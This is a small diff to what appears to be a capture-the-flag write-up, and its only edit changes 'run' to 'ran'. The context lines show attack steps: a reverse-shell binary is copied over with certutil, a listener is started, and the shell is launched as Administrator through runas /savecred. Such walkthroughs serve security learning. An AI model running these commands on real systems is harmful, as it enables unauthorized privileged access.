@@ -239,7 +239,7 @@ I transferred `rev.exe` to `C:\Temp\` with `certutil` and started a listener:
 penelope -p 1234
 ```
 
-And run the reverse shell:
+And ran the reverse shell:
 
 ```shell
 runas /savecred /user:Administrator C:\temp\rev.exe
